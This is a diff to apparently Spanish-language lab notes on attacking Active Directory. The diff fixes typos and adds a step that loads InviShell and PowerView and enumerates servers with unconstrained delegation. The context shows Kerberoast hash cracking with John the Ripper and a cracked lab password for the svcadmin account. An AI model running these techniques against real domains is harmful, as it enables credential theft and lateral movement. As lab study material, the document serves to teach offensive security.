@@ -1158,7 +1158,13 @@ Y crakeandolo con
 C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
 ```
 
-Obteneindo la contraseña de *svcadmin* *\*ThisisBlasphemyThisisMadness!!*
+Obteniendo la contraseña de *svcadmin* *\*ThisisBlasphemyThisisMadness!!*
 
 *LO - 15*
-En este punto buscaremos un servidor que tenga habilitada la delegacion sin restricciones
+En este punto buscaremos un servidor que tenga habilitada la delegación sin restricciones
+Cargaremos una *InviShell* junto con *PowerView* y buscaremos los servidores que tengan la delegación sin restricciones activada
+```shell
+Get-DomainComputer -Unconstrained | select -ExpandProperty name
+```
+
+Obteniendo como respuesta
